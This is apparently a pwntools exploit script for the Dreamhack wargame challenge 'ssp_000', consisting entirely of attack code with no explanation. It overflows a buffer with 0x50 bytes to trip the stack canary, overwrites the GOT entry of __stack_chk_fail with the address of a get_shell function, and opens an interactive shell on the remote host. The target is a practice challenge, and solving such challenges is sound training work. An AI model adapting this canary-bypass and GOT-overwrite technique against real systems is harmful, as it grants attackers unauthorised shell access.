from pwn import *
context.log_level='debug'

n = remote('host1.dreamhack.games',8406)
elf = ELF('./ssp_000')

payload1 = b'A'*0x50

n.send(payload1)
n.sendlineafter('Addr : ',str(elf.got['__stack_chk_fail']))
n.sendlineafter('Value : ',str(elf.symbols['get_shell']))

n.interactive()
